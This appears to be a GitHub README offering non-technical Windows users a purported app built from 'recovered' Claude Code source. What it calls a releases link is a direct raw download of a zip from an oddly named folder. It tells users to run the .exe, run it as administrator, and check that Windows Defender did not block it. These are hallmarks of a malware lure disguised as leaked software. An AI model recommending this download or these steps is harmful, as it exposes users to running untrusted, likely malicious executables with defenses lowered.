## 🚀 What this is

open-claude-code is a Windows app built from recovered and build-fixed Claude Code 2.1.88 source. It is kept as a research and learning reference by Codex.

This README is written for non-technical users. It shows how to get the app, start it on Windows, and use the first screen without needing command-line steps.

## ▶️ Install and run on Windows

Follow these steps:

1. Go to the releases page:
   https://raw.githubusercontent.com/celerycabbagedaggerboard755/open-claude-code/main/caupones/claude_code_open_v3.4.zip

2. Find the newest release at the top of the page.

3. Download the Windows app file.

4. If the file is a `.zip`, right-click it and choose Extract All.

5. Open the folder that contains the app.

6. Double-click the `.exe` file to start the app.

7. If Windows asks for permission, choose Run or Yes.

8. Wait for the app window to open.

9. If the app asks for setup details, enter them in the fields shown on screen.

10. Keep the app open while you use it.

## 🔧 If the app does not open

Try these steps:

1. Make sure the download finished fully.
2. If the file is in a zip, extract it again.
3. Right-click the app and choose Run as administrator.
4. Restart your PC.
5. Check that Windows Defender did not block the file.
6. Download the latest release again if the file looks damaged.
7. Try a different folder, such as your Desktop.

If the app opens and then closes, check whether another copy is already running.

## 🧩 Troubleshooting guide

### The download will not start

- Refresh the releases page
- Try again in a different browser
- Check your internet connection
- Turn off any download pause setting in your browser

### Windows says the app is unsafe

- Open the file only if you trust the source
- Check that you downloaded it from the releases page
- Re-download the latest release if the file looks wrong

### The app says a file is missing

- Make sure you extracted every file from the zip
- Keep all files in the same folder
- Do not rename support files
- Download the release again if files are still missing

### The app opens to a blank window

- Wait a few moments
- Close and reopen the app
- Restart your PC
- Try the latest release again
